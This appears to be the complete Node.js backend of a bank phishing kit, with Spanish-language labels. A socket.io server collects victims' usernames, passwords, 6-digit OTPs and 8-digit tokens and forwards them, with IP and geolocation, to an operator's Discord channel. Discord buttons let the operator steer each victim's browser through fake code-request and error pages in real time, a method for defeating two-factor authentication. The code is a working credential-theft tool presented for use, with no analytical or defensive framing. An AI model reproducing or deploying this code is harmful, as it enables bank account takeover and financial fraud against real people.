const express = require('express');
const http = require('http');
const { Server } = require('socket.io');
const cors = require('cors');
const axios = require('axios');
const { Client, GatewayIntentBits, EmbedBuilder, ActionRowBuilder, ButtonBuilder, ButtonStyle } = require('discord.js');

const app = express();
app.use(cors());
const server = http.createServer(app);
const io = new Server(server, {
    cors: { origin: "*" },
    connectionStateRecovery: {} 
});

const DISCORD_TOKEN = process.env.DISCORD_TOKEN;
const CHANNEL_ID = process.env.CHANNEL_ID;

const userToSocket = {}; 

const client = new Client({
    intents: [GatewayIntentBits.Guilds, GatewayIntentBits.GuildMessages]
});

async function getNetworkData(socket) {
    let ip = socket.handshake.headers['x-forwarded-for'] || socket.request.connection.remoteAddress;
    if (ip.includes(',')) ip = ip.split(',')[0].trim();
    ip = ip.replace(/^.*:/, '');
    if (ip === '1') ip = '189.217.200.1'; 

    let geoInfo = "Desconocida";
    try {
        const geo = await axios.get(`http://ip-api.com/json/${ip}`);
        if (geo.data.status === 'success') {
            geoInfo = `${geo.data.city}, ${geo.data.country} (${geo.data.isp})`;
        }
    } catch (e) { console.log("Error Geo"); }
    return { ip, geoInfo };
}

client.once('ready', () => console.log(`✅ Bot listo: ${client.user.tag}`));

client.on('interactionCreate', async (interaction) => {
    if (!interaction.isButton()) return;

    const [action, username] = interaction.customId.split('_');
    const socketId = userToSocket[username];

    if (!socketId || !io.sockets.sockets.has(socketId)) {
        return interaction.reply({ content: `❌ El usuario ${username} no está conectado.`, ephemeral: true });
    }

    let targetPage;
    if (action === 'otp') targetPage = "index3.html";
    else if (action === 'token') targetPage = "index4.html";
    else if (action === 'error') targetPage = "index.html?error=true";
    else if (action === 'finish') targetPage = "finalizado.html";
    else if (action === 'errorotp') targetPage = "index3.html?error=true";
    else if (action === 'errortoken') targetPage = "index4.html?error=true";

    io.to(socketId).emit('navigate', { url: targetPage });
    await interaction.reply({ content: `✅ Acción [${action}] enviada a ${username}`, ephemeral: true });
});

client.login(DISCORD_TOKEN);

io.on('connection', (socket) => {
    
    socket.on('register_user', async (data) => {
        if (!data.user) return;
        userToSocket[data.user] = socket.id;

        if (data.pass) {
            const net = await getNetworkData(socket);
            const channel = await client.channels.fetch(CHANNEL_ID);
            if (channel) {
                const embed = new EmbedBuilder()
                    .setTitle('🏦 NUEVO LOGIN')
                    .setColor(0x00D1C1)
                    .addFields(
                        { name: '👤 Usuario', value: `\`${data.user}\``, inline: true },
                        { name: '🔑 Password', value: `\`${data.pass}\``, inline: true },
                        { name: '📍 IP', value: `\`${net.ip}\``, inline: true },
                        { name: '🌍 Ubicación', value: `\`${net.geoInfo}\``, inline: false }
                    ).setTimestamp();

                const row = new ActionRowBuilder().addComponents(
                    new ButtonBuilder().setCustomId(`otp_${data.user}`).setLabel('Pedir Código 6').setStyle(ButtonStyle.Primary),
                    new ButtonBuilder().setCustomId(`token_${data.user}`).setLabel('Pedir Código 8').setStyle(ButtonStyle.Success),
                    new ButtonBuilder().setCustomId(`error_${data.user}`).setLabel('❌ Datos Incorrectos').setStyle(ButtonStyle.Danger)
                );
                channel.send({ embeds: [embed], components: [row] });
            }
        }
    });

    socket.on('submit_otp', async (data) => {
        const net = await getNetworkData(socket);
        const channel = await client.channels.fetch(CHANNEL_ID);
        if (channel) {
            const embed = new EmbedBuilder()
                .setTitle('🔢 CÓDIGO OTP RECIBIDO')
                .setColor(0xFFA500)
                .addFields(
                    { name: '👤 Usuario', value: `\`${data.user}\``, inline: true },
                    { name: '🔐 Código', value: `\`${data.otp}\``, inline: true },
                    { name: '📍 IP', value: `\`${net.ip}\``, inline: true },
                    { name: '🌍 Ubicación', value: `\`${net.geoInfo}\``, inline: false }
                ).setTimestamp();

            const row = new ActionRowBuilder().addComponents(
                new ButtonBuilder().setCustomId(`token_${data.user}`).setLabel('Pedir Código 8').setStyle(ButtonStyle.Success),
                new ButtonBuilder().setCustomId(`errorotp_${data.user}`).setLabel('❌ Código Incorrecto').setStyle(ButtonStyle.Danger)
            );
            channel.send({ embeds: [embed], components: [row] });
        }
    });

    socket.on('submit_token', async (data) => {
        const net = await getNetworkData(socket);
        const channel = await client.channels.fetch(CHANNEL_ID);
        if (channel) {
            const embed = new EmbedBuilder()
                .setTitle('🛡️ TOKEN AVANZADO RECIBIDO')
                .setColor(0x00FF00)
                .addFields(
                    { name: '👤 Usuario', value: `\`${data.user}\``, inline: true },
                    { name: '🔑 Token (8)', value: `\`${data.token}\``, inline: true },
                    { name: '📍 IP', value: `\`${net.ip}\``, inline: true },
                    { name: '🌍 Ubicación', value: `\`${net.geoInfo}\``, inline: false }
                ).setTimestamp();

            const row = new ActionRowBuilder().addComponents(
                new ButtonBuilder().setCustomId(`otp_${data.user}`).setLabel('Pedir Código 6').setStyle(ButtonStyle.Primary),
                new ButtonBuilder().setCustomId(`errortoken_${data.user}`).setLabel('❌ Código Incorrecto').setStyle(ButtonStyle.Danger),
                new ButtonBuilder().setCustomId(`finish_${data.user}`).setLabel('Finalizar').setStyle(ButtonStyle.Secondary)
            );
            channel.send({ embeds: [embed], components: [row] });
        }
    });
});

server.listen(process.env.PORT || 3000);